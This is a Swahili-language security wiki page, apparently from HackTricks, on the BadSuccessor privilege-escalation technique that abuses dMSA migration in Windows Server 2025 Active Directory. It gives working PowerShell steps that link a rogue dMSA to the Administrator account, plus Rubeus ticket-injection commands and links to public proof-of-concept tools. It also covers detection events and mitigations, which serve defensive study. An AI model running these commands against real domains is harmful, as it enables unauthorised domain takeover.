# BadSuccessor: Kuongeza Privilege kupitia Matumizi Mabaya ya Uhamishaji wa dMSA Uliokasimiwa

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Delegated Managed Service Accounts (**dMSA**) ni mrithi wa kizazi kijacho wa **gMSA**, unaokuja na Windows Server 2025. Mchakato halali wa uhamishaji huruhusu wasimamizi kubadilisha akaunti *ya zamani* (ya mtumiaji, kompyuta au huduma) na dMSA huku ruhusa zikihifadhiwa bila kuathiri utendaji. Mchakato huu unapatikana kupitia PowerShell cmdlets kama `Start-ADServiceAccountMigration` na `Complete-ADServiceAccountMigration`, na hutumia LDAP attributes mbili za **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* kwa akaunti iliyobadilishwa (ya zamani).
* **`msDS-DelegatedMSAState`**       – hali ya uhamishaji (`0` = hakuna, `1` = unaendelea, `2` = *umekamilika*).<sup>[[1]](#references)</sup>

Ikiwa mshambuliaji anaweza kuunda dMSA **yoyote** ndani ya OU na kurekebisha moja kwa moja attributes hizo 2, LSASS na KDC zitachukulia dMSA hiyo kuwa *mrithi* wa akaunti iliyounganishwa. Mshambuliaji anapothibitisha utambulisho wake kama dMSA hiyo, **anarithi privilege zote za akaunti iliyounganishwa** – hadi **Domain Admin** ikiwa akaunti ya Administrator imeunganishwa.<sup>[[1]](#references)</sup>

Mbinu hii iliitwa **BadSuccessor** na Unit 42 mwaka 2025. Baadaye Microsoft iliipa **CVE-2025-53779** na kutoa security update mnamo **Agosti 2025**. Mbinu hii bado inahusika katika mazingira ya Windows Server 2025 ambayo hayajapachikwa na katika ukaguzi wa delegation hatari ya OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Kwenye DC zilizopachikwa, [uhamishaji wa dMSA wa pande mbili](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) bado unaweza kufichua akaunti lengwa ikiwa mshambuliaji anaweza pia kuandika migration attributes zake. Hii ina wigo finyu zaidi kuliko shambulio la awali dhidi ya lengwa lolote.

### Masharti ya shambulio

1. Akaunti inayo *ruhusiwa* kuunda objects ndani ya **Organizational Unit (OU)** *na* ina angalau ruhusa moja kati ya hizi:
   * `Create Child` → object class ya **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (uundaji wa jumla)
2. Muunganisho wa mtandao kwa LDAP na Kerberos (hali ya kawaida ya kujiunga na domain / shambulio la mbali).<sup>[[1]](#references)</sup>

## Kuhesabu OUs Zilizo Hatarini

Unit 42 ilitoa PowerShell helper script inayochanganua security descriptors za kila OU na kuonyesha ACE zinazohitajika:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Chini ya pazia, script hutekeleza utafutaji wa LDAP wa kurasa kwa `(objectClass=organizationalUnit)` na hukagua kila `nTSecurityDescriptor` kwa

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (object class *msDS-DelegatedManagedServiceAccount*)

## Hatua za Exploitation

Mara tu OU inayoweza kuandikwa inapogunduliwa, shambulio linahitaji maandishi 3 tu ya LDAP:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Baada ya replication, mshambuliaji anaweza **logon** tu kama `attacker_dMSA$` au kuomba Kerberos TGT – Windows itaunda tokeni ya akaunti *superseded*.<sup>[[1]](#references)</sup>

### Uendeshaji wa Kiotomatiki

PoC kadhaa za umma hujumuisha workflow nzima, ikiwemo kupata password na kudhibiti tiketi:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Moduli ya NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Utambuzi na Uwindaji

Washa **Object Auditing** kwenye OUs na ufuatilie Windows Security Events zifuatazo:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Uundaji wa object ya **dMSA**
* **5136** – Marekebisho ya **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Mabadiliko mahususi ya attribute
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Utoaji wa TGT kwa dMSA

Kulinganisha `4662` (marekebisho ya attribute), `4741` (uundaji wa akaunti ya kompyuta/huduma) na `4624` (logon inayofuata) huangazia haraka shughuli za BadSuccessor. Suluhisho za XDR kama **XSIAM** huja na queries zilizo tayari kutumika (tazama marejeo).<sup>[[2]](#references)</sup>

## Kupunguza Hatari

* Tumia sasisho la usalama la Microsoft la **CVE-2025-53779** na uhakikishe kiwango cha patch kwa kila domain controller ya Windows Server 2025.<sup>[[6]](#references)</sup>
* Tumia kanuni ya **least privilege** – kabidhi usimamizi wa *Service Account* kwa roles zinazoaminika pekee.
* Ondoa `Create Child` / `msDS-DelegatedManagedServiceAccount` kwenye OUs ambazo hazihitaji waziwazi ruhusa hiyo.
* Fuatilia event IDs zilizoorodheshwa hapo juu na utoe tahadhari pale identities zisizo za *Tier-0* zinapounda au kuhariri dMSAs.

## Tazama pia


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Kutumia dMSA vibaya ili Kuongeza Haki katika Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Akaunti Nzuri Zinapokuwa Mbaya: Kutumia vibaya Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Moduli ya NetExec BadSuccessor](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
